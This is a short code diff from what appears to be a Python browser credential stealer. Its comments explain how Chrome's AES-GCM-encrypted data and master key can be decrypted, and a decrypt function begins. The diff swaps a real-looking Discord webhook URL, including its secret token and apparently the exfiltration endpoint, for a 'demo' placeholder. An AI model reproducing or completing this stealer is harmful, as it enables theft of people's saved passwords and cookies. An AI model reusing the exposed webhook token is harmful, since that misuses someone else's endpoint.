@@ -12,7 +12,7 @@ import requests
 #chrome encrypt files in AES-GCM format
 #master key for the format faund on the pc in phisical dir and using CryptProtectData func
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1380222529209241680/jOwJW5pI3_hLmcpsOVjSLsS3rZyYGiRDS49oKPa0myTKTAnRJ_vwqNhaFggDyJOfhji-"
+WEBHOOK_URL = "your demo webhook"
 
 def decrypt(buff, master_key):
     try:
